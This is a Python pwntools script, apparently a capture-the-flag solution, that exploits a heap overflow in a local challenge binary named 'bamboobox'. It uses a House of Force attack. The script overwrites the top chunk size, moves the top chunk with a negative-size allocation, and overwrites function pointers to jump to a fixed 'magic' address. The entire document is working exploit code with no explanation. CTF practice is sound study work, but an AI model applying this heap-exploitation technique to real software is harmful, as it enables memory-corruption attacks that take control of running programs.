from pwn import *
context.binary = './bamboobox'
context.log_level = 'debug'
elf = context.binary

p = process('./bamboobox')	
def add(size, content):
	p.recvuntil('Your choice:')
	p.sendline('2')
	p.recvuntil('Please enter the length of item name:')
	p.sendline(str(size))
	p.recvuntil('Please enter the name of item:')
	p.send(content)
	print "add a chunk sucess!"
	
def change(idx, size, content):
	p.recvuntil('Your choice:')
	p.sendline('3')
	p.recvuntil('Please enter the index of item:')
	p.sendline(str(idx))
	p.recvuntil('Please enter the length of item name:')
	p.sendline(str(size))
	p.recvuntil('Please enter the new name of the item:')
	p.send(content)
	
	print "change chunk %d sucess" % idx

def remove(idx):
	p.recvuntil('Your choice:')
	p.sendline('4')
	p.recvuntil('Please enter the index of item:')
	p.sendline(str(idx))
	
	print "remove chunk %d sucess!" % idx

add(0x80, 'a')

magic_addr = 0x400D49
#heapbase=0xdeadbeef
#target_addr = heapbase+0x10
#topchunk_addr = heapbase+0x20+0x90
#offset = target_addr - 0x10-topchunk_addr

offset = -(0x90+0x20+0x10)
change(0, 0x90, 'b'*0x80 + '\x00'*8 +'\xff'*8)

add(offset, 'b')
#now the topchunk points to heapbase
add(0x10, p64(magic_addr)*2)

p.recvuntil('Your choice:')
p.sendline('5')

p.interactive()
p.close()
